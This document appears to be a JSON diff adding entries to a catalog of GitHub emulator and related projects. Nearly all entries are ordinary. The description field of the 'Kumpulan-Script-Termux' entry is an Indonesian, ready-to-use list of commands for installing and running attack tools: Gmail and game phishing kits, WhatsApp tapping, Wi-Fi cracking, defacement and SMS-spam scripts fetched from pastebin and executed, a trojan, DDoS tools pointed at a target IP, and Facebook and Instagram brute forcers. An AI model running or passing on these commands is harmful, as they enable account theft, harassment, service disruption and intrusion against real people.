+    "description": "The quadplay✜ fantasy console"
+  },
+  {
+    "name": "honeypots",
+    "slug": "honeypots",
+    "creator": "qeeqbox",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/qeeqbox/honeypots",
+    "cover": "https://avatars.githubusercontent.com/u/54420737?v=4",
+    "description": "30 different honeypots in one package! (dhcp, dns, elastic, ftp, http proxy, https proxy, http, https, imap, ipp, irc, ldap, memcache, mssql, mysql, ntp, oracle, pjl, pop3, postgres, rdp, redis, sip, smb, smtp, snmp, socks5, ssh, telnet, vnc)"
+  },
+  {
+    "name": "scrcpy-mask",
+    "slug": "scrcpy-mask",
+    "creator": "AkiChase",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/AkiChase/scrcpy-mask",
+    "cover": "https://avatars.githubusercontent.com/u/59353056?v=4",
+    "description": "A Scrcpy client in Rust, Bevy and React, aimed at providing mouse and key mapping to control Android device, similar to a game emulator"
+  },
+  {
+    "name": "distribution",
+    "slug": "distribution",
+    "creator": "JustEnoughLinuxOS",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/JustEnoughLinuxOS/distribution",
+    "cover": "https://avatars.githubusercontent.com/u/99055404?v=4",
+    "description": "Home of the JELOS Linux distribution."
+  },
+  {
+    "name": "rvemu",
+    "slug": "rvemu",
+    "creator": "d0iasm",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/d0iasm/rvemu",
+    "cover": "https://avatars.githubusercontent.com/u/12879646?v=4",
+    "description": "RISC-V emulator for CLI and Web written in Rust with WebAssembly. It supports xv6 and Linux (ongoing)."
+  },
+  {
+    "name": "Awesome-GameEmulator",
+    "slug": "awesome-gameemulator",
+    "creator": "liminbai",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/liminbai/Awesome-GameEmulator",
+    "cover": "https://avatars.githubusercontent.com/u/15081266?v=4",
+    "description": "Game emulator information"
+  },
+  {
+    "name": "Achievement-Watcher",
+    "slug": "achievement-watcher",
+    "creator": "xan105",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/xan105/Achievement-Watcher",
+    "cover": "https://avatars.githubusercontent.com/u/14090532?v=4",
+    "description": "A sexy achievement file parser with real-time notification, automatic screenshot and playtime tracking. View every achievements earned on your PC whether it's coming from Steam, a Steam emulator, and more."
+  },
+  {
+    "name": "unicorn_pe",
+    "slug": "unicorn-pe",
+    "creator": "hzqst",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/hzqst/unicorn_pe",
+    "cover": "https://avatars.githubusercontent.com/u/12287588?v=4",
+    "description": "Unicorn PE is an unicorn based instrumentation project designed to emulate code execution for windows PE files."
+  },
+  {
+    "name": "pcsx-redux",
+    "slug": "pcsx-redux",
+    "creator": "grumpycoders",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/grumpycoders/pcsx-redux",
+    "cover": "https://avatars.githubusercontent.com/u/10522192?v=4",
+    "description": "The PCSX-Redux project is a collection of tools, research, hardware design, and libraries aiming at development and reverse engineering on the PlayStation 1. The core product itself, PCSX-Redux, is yet another fork of the Playstation emulator, PCSX."
+  },
+  {
+    "name": "gopher64",
+    "slug": "gopher64",
+    "creator": "gopher64",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/gopher64/gopher64",
+    "cover": "https://avatars.githubusercontent.com/u/144562208?v=4",
+    "description": "Highly compatible N64 emulator"
+  },
+  {
+    "name": "PCem-ROMs",
+    "slug": "pcem-roms",
+    "creator": "BaRRaKudaRain",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/BaRRaKudaRain/PCem-ROMs",
+    "cover": "https://avatars.githubusercontent.com/u/29839832?v=4",
+    "description": "This is a collection of requiered ROMs files for PCem emulator. RIP PCem 2021"
+  },
+  {
+    "name": "ipasim",
+    "slug": "ipasim",
+    "creator": "ipasimulator",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/ipasimulator/ipasim",
+    "cover": "https://avatars.githubusercontent.com/u/52369124?v=4",
+    "description": "iOS emulator for Windows"
+  },
+  {
+    "name": "oboromi",
+    "slug": "oboromi",
+    "creator": "0xNikilite",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/0xNikilite/oboromi",
+    "cover": "https://avatars.githubusercontent.com/u/109990495?v=4",
+    "description": "a proof-of-concept project for a possible Nintendo Switch 2 emulator."
+  },
+  {
+    "name": "Astro8-Computer",
+    "slug": "astro8-computer",
+    "creator": "sam-astro",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/sam-astro/Astro8-Computer",
+    "cover": "https://avatars.githubusercontent.com/u/77079540?v=4",
+    "description": "Custom 16-bit homebrew CPU, emulator, renderer, PCB, and language"
+  },
+  {
+    "name": "android-emulator-hypervisor-driver",
+    "slug": "android-emulator-hypervisor-driver",
+    "creator": "google",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/google/android-emulator-hypervisor-driver",
+    "cover": "https://avatars.githubusercontent.com/u/1342004?v=4",
+    "description": "..."
+  },
+  {
+    "name": "picolove",
+    "slug": "picolove",
+    "creator": "picolove",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/picolove/picolove",
+    "cover": "https://avatars.githubusercontent.com/u/20487698?v=4",
+    "description": "PICO-8 Reimplementation in Love2D. Chat: https://discord.gg/jGEMUse6RM"
+  },
+  {
+    "name": "CitraVR",
+    "slug": "citravr",
+    "creator": "amwatson",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/amwatson/CitraVR",
+    "cover": "https://avatars.githubusercontent.com/u/1646398?v=4",
+    "description": "Port of the leading 3DS emulator, Citra — designed for playing 3DS homebrew and personal game backups in 3D on the go with your Quest."
+  },
+  {
+    "name": "gameboy",
+    "slug": "gameboy",
+    "creator": "raphamorim",
+    "version": "...",
+    "console": "Game Boy",
+    "url": "https://github.com/raphamorim/gameboy",
+    "cover": "https://avatars.githubusercontent.com/u/3630346?v=4",
+    "description": "The Gameboy emulator that runs everywhere (Terminal, Web, Desktop)"
+  },
+  {
+    "name": "optcarrot",
+    "slug": "optcarrot",
+    "creator": "mame",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/mame/optcarrot",
+    "cover": "https://avatars.githubusercontent.com/u/21557?v=4",
+    "description": "A NES emulator written in Ruby"
+  },
+  {
+    "name": "dumpulator",
+    "slug": "dumpulator",
+    "creator": "mrexodia",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/mrexodia/dumpulator",
+    "cover": "https://avatars.githubusercontent.com/u/2458265?v=4",
+    "description": "An easy-to-use library for emulating memory dumps. Useful for malware analysis (config extraction, unpacking) and dynamic analysis in general (sandboxing)."
+  },
+  {
+    "name": "pound",
+    "slug": "pound",
+    "creator": "pound-emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/pound-emu/pound",
+    "cover": "https://avatars.githubusercontent.com/u/216930531?v=4",
+    "description": "Open source emulator for the Nintedo Switch 1 and 2. Highly work in progress"
+  },
+  {
+    "name": "retroassembly",
+    "slug": "retroassembly",
+    "creator": "arianrhodsandlot",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/arianrhodsandlot/retroassembly",
+    "cover": "https://avatars.githubusercontent.com/u/10987902?v=4",
+    "description": "The personal retro game collection cabinet in your browser. Join us on Discord https://discord.gg/gwaKRAYG6t"
+  },
+  {
+    "name": "MacintoshPi",
+    "slug": "macintoshpi",
+    "creator": "jaromaz",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/jaromaz/MacintoshPi",
+    "cover": "https://avatars.githubusercontent.com/u/22665882?v=4",
+    "description": "MacintoshPi is a project that allows running full-screen versions of Apple's Mac OS 7, Mac OS 8 and Mac OS 9 with sound, active online connection and modem emulation under Raspberry Pi."
+  },
+  {
+    "name": "gaseous-server",
+    "slug": "gaseous-server",
+    "creator": "gaseous-project",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/gaseous-project/gaseous-server",
+    "cover": "https://avatars.githubusercontent.com/u/125975681?v=4",
+    "description": "A game ROM manager, with a built in web based emulator using multiple sources to identify and provide metadata"
+  },
+  {
+    "name": "Ymir",
+    "slug": "ymir",
+    "creator": "StrikerX3",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/StrikerX3/Ymir",
+    "cover": "https://avatars.githubusercontent.com/u/2067844?v=4",
+    "description": "Sega Saturn emulator"
+  },
+  {
+    "name": "chameleon",
+    "slug": "chameleon",
+    "creator": "qeeqbox",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/qeeqbox/chameleon",
+    "cover": "https://avatars.githubusercontent.com/u/54420737?v=4",
+    "description": "19 Customizable honeypots for monitoring network traffic, bots activities and username\\password credentials (DNS, HTTP Proxy, HTTP, HTTPS, SSH, POP3, IMAP, STMP, RDP, VNC, SMB, SOCKS5, Redis, TELNET, Postgres, MySQL, MSSQL, Elastic and ldap) "
+  },
+  {
+    "name": "xenia-manager",
+    "slug": "xenia-manager",
+    "creator": "xenia-manager",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/xenia-manager/xenia-manager",
+    "cover": "https://avatars.githubusercontent.com/u/173571265?v=4",
+    "description": "Xenia Manager is a tool that tries to make using Xenia Emulator easier."
+  },
+  {
+    "name": "cloud-functions-emulator",
+    "slug": "cloud-functions-emulator",
+    "creator": "googlearchive",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/googlearchive/cloud-functions-emulator",
+    "cover": "https://avatars.githubusercontent.com/u/12502296?v=4",
+    "description": "A local emulator for deploying, running, and debugging Google Cloud Functions."
+  },
+  {
+    "name": "amiberry",
+    "slug": "amiberry",
+    "creator": "BlitterStudio",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/BlitterStudio/amiberry",
+    "cover": "https://avatars.githubusercontent.com/u/107620343?v=4",
+    "description": "Optimized Amiga emulator"
+  },
+  {
+    "name": "Cathode-Retro",
+    "slug": "cathode-retro",
+    "creator": "DeadlyRedCube",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/DeadlyRedCube/Cathode-Retro",
+    "cover": "https://avatars.githubusercontent.com/u/3751413?v=4",
+    "description": "A collection of shaders to emulate the display of an NTSC signal through a CRT TV"
+  },
+  {
+    "name": "rvc",
+    "slug": "rvc",
+    "creator": "PiMaker",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/PiMaker/rvc",
+    "cover": "https://avatars.githubusercontent.com/u/10796630?v=4",
+    "description": "A 32-bit RISC-V emulator in a shader (and C)"
+  },
+  {
+    "name": "pistorm",
+    "slug": "pistorm",
+    "creator": "captain-amygdala",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/captain-amygdala/pistorm",
+    "cover": "https://avatars.githubusercontent.com/u/16537586?v=4",
+    "description": "68k Hardware Emulator "
+  },
+  {
+    "name": "martypc",
+    "slug": "martypc",
+    "creator": "dbalsom",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/dbalsom/martypc",
+    "cover": "https://avatars.githubusercontent.com/u/7229541?v=4",
+    "description": "An IBM PC/XT emulator written in Rust."
+  },
+  {
+    "name": "fake-08",
+    "slug": "fake-08",
+    "creator": "jtothebell",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/jtothebell/fake-08",
+    "cover": "https://avatars.githubusercontent.com/u/1558589?v=4",
+    "description": "A Pico-8 player/emulator for console homebrew"
+  },
+  {
+    "name": "pinky",
+    "slug": "pinky",
+    "creator": "koute",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/koute/pinky",
+    "cover": "https://avatars.githubusercontent.com/u/246574?v=4",
+    "description": "An NES emulator written in Rust"
+  },
+  {
+    "name": "Sapphire",
+    "slug": "sapphire",
+    "creator": "SapphireServer",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/SapphireServer/Sapphire",
+    "cover": "https://avatars.githubusercontent.com/u/45236171?v=4",
+    "description": "A Final Fantasy XIV 4.0+ Server Emulator written in C++"
+  },
+  {
+    "name": "core",
+    "slug": "core",
+    "creator": "coreemu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/coreemu/core",
+    "cover": "https://avatars.githubusercontent.com/u/13382289?v=4",
+    "description": "Common Open Research Emulator"
+  },
+  {
+    "name": "puNES",
+    "slug": "punes",
+    "creator": "punesemu",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/punesemu/puNES",
+    "cover": "https://avatars.githubusercontent.com/u/14859058?v=4",
+    "description": "Qt-based Nintendo Entertaiment System emulator and NSF/NSF2/NSFe Music Player (Linux, FreeBSD, OpenBSD and Windows)"
+  },
+  {
+    "name": "x86CSS",
+    "slug": "x86css",
+    "creator": "rebane2001",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/rebane2001/x86CSS",
+    "cover": "https://avatars.githubusercontent.com/u/6316541?v=4",
+    "description": "x86CSS is a working CSS-only x86 CPU/emulator/computer. No JavaScript required."
+  },
+  {
+    "name": "amazon-echo-ha-bridge",
+    "slug": "amazon-echo-ha-bridge",
+    "creator": "armzilla",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/armzilla/amazon-echo-ha-bridge",
+    "cover": "https://avatars.githubusercontent.com/u/1372518?v=4",
+    "description": "emulates philips hue api to other home automation gateways"
+  },
+  {
+    "name": "smolnes",
+    "slug": "smolnes",
+    "creator": "binji",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/binji/smolnes",
+    "cover": "https://avatars.githubusercontent.com/u/1245315?v=4",
+    "description": "NES emulator in <5000 bytes of C"
+  },
+  {
+    "name": "OpenVR-InputEmulator",
+    "slug": "openvr-inputemulator",
+    "creator": "matzman666",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/matzman666/OpenVR-InputEmulator",
+    "cover": "https://avatars.githubusercontent.com/u/16060629?v=4",
+    "description": "An OpenVR driver that allows to create virtual controllers, emulate controller input, manipulate poses of existing controllers and remap buttons. A client-side library that communicates with the driver via shared-memory is also included."
+  },
+  {
+    "name": "halfix",
+    "slug": "halfix",
+    "creator": "nepx",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/nepx/halfix",
+    "cover": "https://avatars.githubusercontent.com/u/23300488?v=4",
+    "description": "x86 PC emulator that runs both natively and in the browser, via WebAssembly"
+  },
+  {
+    "name": "MAME4iOS",
+    "slug": "mame4ios",
+    "creator": "yoshisuga",
+    "version": "...",
+    "console": "Arcade",
+    "url": "https://github.com/yoshisuga/MAME4iOS",
+    "cover": "https://avatars.githubusercontent.com/u/564774?v=4",
+    "description": "Multiple Arcade Machine Emulator for iOS, iPadOS, tvOS, macOS (Catalyst)"
+  },
+  {
+    "name": "MagiskOnEmulator",
+    "slug": "magiskonemulator",
+    "creator": "shakalaca",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/shakalaca/MagiskOnEmulator",
+    "cover": "https://avatars.githubusercontent.com/u/306376?v=4",
+    "description": "Install Magisk on Official Android Emulator"
+  },
+  {
+    "name": "docker-tc",
+    "slug": "docker-tc",
+    "creator": "lukaszlach",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/lukaszlach/docker-tc",
+    "cover": "https://avatars.githubusercontent.com/u/5011490?v=4",
+    "description": ":whale: :vertical_traffic_light: Docker Traffic Control - network rate limiting, emulating delays, losses, duplicates, corrupts and reorders of network packets using only container labels or a command-line interface."
+  },
+  {
+    "name": "pico-mac",
+    "slug": "pico-mac",
+    "creator": "evansm7",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/evansm7/pico-mac",
+    "cover": "https://avatars.githubusercontent.com/u/1134980?v=4",
+    "description": "Run the popular umac emulator right on your Pi Pico!"
+  },
+  {
+    "name": "stella",
+    "slug": "stella",
+    "creator": "stella-emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/stella-emu/stella",
+    "cover": "https://avatars.githubusercontent.com/u/24813348?v=4",
+    "description": "A multi-platform Atari 2600 Emulator"
+  },
+  {
+    "name": "DarkflameServer",
+    "slug": "darkflameserver",
+    "creator": "DarkflameUniverse",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/DarkflameUniverse/DarkflameServer",
+    "cover": "https://avatars.githubusercontent.com/u/76019718?v=4",
+    "description": "The main repository for the Darkflame Universe Server Emulator project."
+  },
+  {
+    "name": "alacritty-themes",
+    "slug": "alacritty-themes",
+    "creator": "rajasegar",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/rajasegar/alacritty-themes",
+    "cover": "https://avatars.githubusercontent.com/u/2083049?v=4",
+    "description": ":rainbow: :lollipop: Themes :candy: :heart_eyes: for Alacritty: A cross-platform GPU-accelerated Terminal emulator"
+  },
+  {
+    "name": "rv8",
+    "slug": "rv8",
+    "creator": "larkmjc",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/larkmjc/rv8",
+    "cover": "https://avatars.githubusercontent.com/u/358119?v=4",
+    "description": "RISC-V simulator for x86-64"
+  },
+  {
+    "name": "SwitchEmuModDownloader",
+    "slug": "switchemumoddownloader",
+    "creator": "amakvana",
+    "version": "...",
+    "console": "Nintendo Switch",
+    "url": "https://github.com/amakvana/SwitchEmuModDownloader",
+    "cover": "https://avatars.githubusercontent.com/u/66264136?v=4",
+    "description": "SwitchEmuModDownloader - A Cross-Platform One-Click Games Mod Downloader for Switch emulators. Formerly YuzuModDownloader."
+  },
+  {
+    "name": "RetroESP32",
+    "slug": "retroesp32",
+    "creator": "retro-esp32",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/retro-esp32/RetroESP32",
+    "cover": "https://avatars.githubusercontent.com/u/50452432?v=4",
+    "description": "Retro ESP32 is a turbo charged Odroid Go Launcher, Emulator and ROM Manager"
+  },
+  {
+    "name": "bsnes-hd",
+    "slug": "bsnes-hd",
+    "creator": "DerKoun",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/DerKoun/bsnes-hd",
+    "cover": "https://avatars.githubusercontent.com/u/6045077?v=4",
+    "description": "bsnes fork that adds HD video features"
+  },
+  {
+    "name": "NeoTerm",
+    "slug": "neoterm",
+    "creator": "NeoTerrm",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/NeoTerrm/NeoTerm",
+    "cover": "https://avatars.githubusercontent.com/u/30503806?v=4",
+    "description": "👍 modern terminal emulator for Android"
+  },
+  {
+    "name": "retrowin32",
+    "slug": "retrowin32",
+    "creator": "evmar",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/evmar/retrowin32",
+    "cover": "https://avatars.githubusercontent.com/u/3847?v=4",
+    "description": "windows emulator"
+  },
+  {
+    "name": "riscv-rust",
+    "slug": "riscv-rust",
+    "creator": "takahirox",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/takahirox/riscv-rust",
+    "cover": "https://avatars.githubusercontent.com/u/7637832?v=4",
+    "description": "RISC-V processor emulator written in Rust+WASM"
+  },
+  {
+    "name": "chip8-test-suite",
+    "slug": "chip8-test-suite",
+    "creator": "Timendus",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Timendus/chip8-test-suite",
+    "cover": "https://avatars.githubusercontent.com/u/2649939?v=4",
+    "description": "A collection of ROM images with tests that will aid you in developing your own CHIP-8, SUPER-CHIP or XO-CHIP interpreter (or \"emulator\")"
+  },
+  {
+    "name": "Kumpulan-Script-Termux",
+    "slug": "kumpulan-script-termux",
+    "creator": "landy22granatt",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/landy22granatt/Kumpulan-Script-Termux",
+    "cover": "https://avatars.githubusercontent.com/u/65669214?v=4",
+    "description": "Ok, Langsung Saja Ke Materi. Sesuai Judul, Disini Saya Akan Memberikan Kumpulan Script Termux Yang Masih Work. Karena, Jarang Sekali Saat Ini Mendapatkan Script Yang Benar-Benar Work.  ✓BOT KOMEN DAN LIKE INSTAGRAM $ pkg update $ pkg upgrade $ pkg install python2 $ pkg install ruby $ gem install lolcat $ pkg install git $git clonehttps://github.com/Hanzelnutt/instabot $ cd instabot $ ls $ pip2 install -r requirements.txt $ bash instabot  ✓PHISING AKUN GMAIL $apt-get update && apt-get upgrade $ apt-get install git $ apt-get install python python-pip python-setuptools $ pip install scapy $ git clone https://github.com/wifiphisher/wifiphisher.git $ cd wifiphisher< $ python setup.py install $ cd wifiphisher $ python wifiphisher  2. EXPLOIT  ✓SADAP WHATSAPP $ pkg install git python2 $ git clone https://github.com/Bl4ckDr460n/HxWhatsApp $ cd HxWhatsapp $chmod +x HxWhatsApp $ python2 HxWhatsApp.py  ✓CONNECT WIFI TANPA PASWORD $apt update && apt upgrade $pkg install git $git clone https://github.com/esc0rtd3w/wifi-hacker $cd wifi-hacker/ $chmod +x wifi-hacker.sh $./wifi-hacker.sh  ✓MELACAK LOKASI Script ini menggunakan alamat IP untuk melacak koordinat target. $apt update $apt upgrade $pkg install python git $git clonehttps://github.com/maldevel/IPGeoLocation $cd IPGeoLocation $chmod +x ipgeolocation.py $pip install -r repuirements.txt $python ipgeolocation.py -m $python ipgeolocation.py -h $python ipgeolocation.py -t 10.99.110.220  Ubah alamat IP yang berwarna kuning dengan alamat IP dari orang yang ingin dilacak. Kemudian copas semua koordinat mulai dari https:// ke browser kalian. *✓DEFACE'  Deface merupakan kata dari bahasa ingris yang artinya merusak, mengotori, mencoreng, dan menghapus. Namun dalam dunia hacker deface adalah kegiatan hacking dengan merubah tampilan suatu website. Baik halaman utama maupun halaman yang terkait dalam suatu url. $apt update && apt upgrade $apt install python2 openssl curl libcurl $pip2 install urllib3 chardet certifi idna requests $mkdir webdav $cd webdav $wget https://pastebin.com/raw/HnVyQPtR $mv HnVyQPtR webdav.py $chmod +x webdav.py  ✓SPAM SMS $pkg install php curl $pkg install curl $curl https://pastebin.com/raw/9BYy1JVc -o jdid.php $php jdid.php  ✓SPAM CALL (TOKOPEDIA) $apt update && apt upgrade $pkg install php $pkg install git $git clone https://github.com/storiku/Call $cd Call $php spamcall.php  Lalu masukan no hp korban  ✓SC TROJAN (TARGET) $pkg update & pkg upgrade $pkg install git $git clone https://github.com/4L13199/meTAInstall $cd meTAInstall $chmod +x meTAInstall $sh meTAInstall.sh 3.TOOL INSTALLER Tools installer adalah tools yang digunakan untuk menginstal banyak script. Biasanya tools installer dapat menginstal 200-300 script.  ✓TOOLS SCORPION $git clone https://github.com/ScorpRx/ScorpRx-Tools $cd ScorpRx-Tools $chmod +x ScorpRx-Tools.sh $sh ScorpRx-Tools.sh  ✓TOOLS NETHUNTER $apt update $apt install git $git clone https://github.com/Hax4us/Nethunter-In-Termux.git $cd Nethunter $chmod +x kalinethunter $./kalinethunter $./startkali.sh  ✓TOOLS LAZYMUX $pkg update && upgrade $pkg install python2 git $git clone https://github.com/Gameye98/Lazymux $cd Lazymux $chmod +x lazymux.py $python2 lazymux.py  ✓TOOLS DAIJOBU $apt upgrade && apt update $apt install php git $git clone https://github.com/alintamvanz/diejoubu $cd diejoubu $cd v1.2 $php diejoubu.php  ✓TOOLS B4J1N94N $git clonehttps://github.com/DarknessCyberTeam/B4J1N64Nv5 $cd B4J1N64Nv5 $sh B4J1N64N.sh  *4. DDOS DDOS attack adalah singkatan dari distributed denial of services yang berfungsi untuk membuat suatu server komputer menjadi tidak bisa dipakai oleh user-nya, dengan menggunakan ribuan system yang menyerang secara bersamaan.  ✓HAMMER $pkg update && pkg upgrade $pkg install python git $git clone https://github.com/cyweb/hammer $cd hammer $python hammer.py $python hammer.py -s [IP target] -p [PORT] -t 135  ✓LUCINTA DDOS $ apt update && napt upgrade $ apt install python $ apt install git $ git clone https://github.com/zlucifer/lucita_ddos $ cd lucita_ddos $ chmod +x pukul.py $ python pukul.py  ✓DDOS TROJAN $ pkg update && pkg upgrade $ pkg install python $ pkg install bash $ pkg install toilet $ pkg install lolcat $ pkg install git $ git clone https://github.com/MrTamfanX/MrDdos $ cd MrDdos $ sh Tamfan-Ddos.sh  ✓Win 32DDOS ATTACK $ apt upgrade&&apt update $ apt install git toilet $ apt install python $ apt install python2 $ git clone https://github.com/banghyuu/ddosWD ‌$ cd ddosWD $ sh Ddos.sh  √XERXES ‌$ apt install git $ apt install clang $ git clone https://github.com/zanyarjamal/xerxes $ ls $ cd xerxes $ ls $ clang xerxes.c -o xerxes $ ls $ ./xerxes (nama website) 80  √TORSHAMMER $ pkg update $ pkg install git $ apt install tor $ pkg install python2 $ git clone https://github.com/dotfighter/torshammer.git $ ls $ cd torshammer $ chmod +x torshammer.oy $ python2 torshammer.py  ✓VANESSA ANGGEL DDOS $ pkg update && pkg upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/MiSetya/VA-DDOS $ cd VA-DDOS $ ls $ chmod +x 80juta.py $ ls $ python2 80juta.py  ✓DDOS BY.BLACKCYC $pkg install git $git clone https://github.com/BlackCyberAnonim/B-ATTACKING $cd B-ATTACKING $ls $sh install.Sh  Virtex for Whatsapp  apt update && apt upgrade  apt install git  apt install curl  apt install figlet  apt install ruby  gem install lolcat  git clone https://github.com/muhammadfathul/VIRTEX  cd VIRTEX  chmod +x virtex.sh  sh virtex.sh  ⚔TOOLS HACK VIA TERMUX⚔  🔰TOOLS HACK FB TEMAN🔰 Versi Terbaru Cracknya Lbh Cepat  $ apt update && apt upgrade $ pip2 install --upgrade pip $ pip2 install requests $ pip2 install mechanize $ pkg install git $ git clone https://github.com/blackcodercrush/hack-facebook-teman $ cd hack-facebook-teman $ sh requests.sh $ python2 hack-fb.py _______________  🔰Hack Facebook target 🔰  $ apt update && apt upgrade $ apt install git $ apt install python2 $ pip2 install mechanize $ git clone https://github.com/FR13ND8/BRUTEFORCEnew $ cd BRUTEFORCEnew $ sh new.sh _______________ 🔰Hack ig🔰  $ pkg install nano $ pkg install figlet  $ pkg install python2 $ pip2 install lolcat  $ pkg install cowsay $ pkg install git $ git clone https://github.com/darkcurut08/darkcurut08 $ cd darkcurut08 $ sh Moreno77.sh _______________  🔰Hack Facebook Terbaru🔰  $ apt update && apt upgrade $ pkg ins toilet $ pkg ins figlet $ pkg ins ruby $ pkg ins gem $ gem ins lolcat $ pkg ins php $ pkg ins python2 $ pkg ins git $ git clone https://github.com/Rusmana-ID/rus, $ cd rus $ sh v2.sh  rename: Anak pw: Bangsa _______________ 🔰TOOLS SADAP🔰  $ apt update && apt upgrade $ apt install php git $ apt install bash $ git clone https://github.com/MrTamfanX/TamfanFacebook $ cd TamfanFacebook $ chmod +x * $ chmod -R 775 lib $ sh install.sh $ sh tamfan.sh _______________ 🔰DDos Attack WI-FI🔰  $ apt update && apt upgrade $ apt install python2 $ apt install git $ $ cd LITEDDOS  Cek:https://ipsaya.com/hostinglokasi.php  $ python2 LITEDDOS.py [IP target] 80 100 _______________ 🔰DDos Attack HP Orang 🔰  $ apt update && apt upgrade $ pkg install python2 $ pip2 install mechanize $ pip2 install request $ pkg install git $ git clone https://github.com/R133F/Trojans $ cd Trojans $ python2 trojans.py   DDOS WiFi nya masih work  Hack Fb Target New  ------------------------------------------  pkg install git pkg install python2 pip2 install --upgrade pip pip2 install mechanize git clone https://github.com/MRA27/FBNEWV2 cd FBNEWV2 python2 MRA27.py 100003191711187   apt update && apt upgrade apt install php apt install python2 apt install toilet apt install git git clone https://github.com/4L13199/LITESPAM cd LITESPAM sh LITESPAM.sh  Oke langsung saja ke penginstalannya..  $ apt update && apt upgrade $ apt install git $ apt install php $ apt install figlet $ apt install toilet $ apt install python2 $ pip2 install requests $ pip2 install termcolor $ git clone https://github.com/DarknessCyberTeam/BAJINGANv6.git $ cd BAJINGANv6 $ sh BAJINGAN.sh Masukkan Username Ini username : BAJINGAN Masukkan Password Ini password :  Gans Kumpulan Tools By InYourG00D Izin promosi biar laku ea  Nuub Numpang Lewat  Silahkan Cek https://github.com/InYourG00D1 Disitu Ada Tools Bermanfaat :V Work gk? lu cobain aja   ÷Kumpulan Kode Unik fb÷ $ pkg install update && pkg install upgrade $ apt install toilet $ apt install figlet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/Unix $ cd Unix $ sh KD-FB.sh  ÷Tools Check BIN÷ $ pkg install update & pkg install upgrade $ pkg install git $ git clone https://github.com/InYourG00D1/check $ cd check $ php bin.php  ÷Tools Spam bom÷ Vitur  1.Spam bom Bukalapak 2.Spam bom JD-ID 3.Spam Bom PHD 4.Spam Bom Tokoped 5.Spam Bom Hooq 6.Spam Bom KFC 7.Spam bom matahari _Totur nya _ $ pkg install update && pkg install upgrade $ pkg install toilet $ pkg install figlet $ pkg install lolcat $ pkg install php $ pkg install python2 $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/Spam $ cd Spam $ sh ms.sh  ÷Kuota free Khusus Tree÷ $ pkg install update && pkg install upgrade $ apt install toilet $ apt install figlet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/KuotaFree $ cd KuotaFree $ sh 2.sh  ÷Pulsa Free work100%÷ $ pkg update&&pkg upgrade $ pkg install toilet $ gem install lolcat $ git clone https://github.com/InYourG00D1/PulsaFree $ ls $ cd PulsaFree $ sh Free.sh  ÷Tools Sc Phising All Game÷ Tapi gk semua game juga si :V $ apt update && apt upgrade $ apt install figlet $ apt install toilet $ gem install lolcat $ pkg install git $ git clone https://github.com/InYourG00D1/ScPh1s1ng $ cd ScPh1s1ng $ sh 6.sh  ÷Kumpulan shell & sc pepes÷ 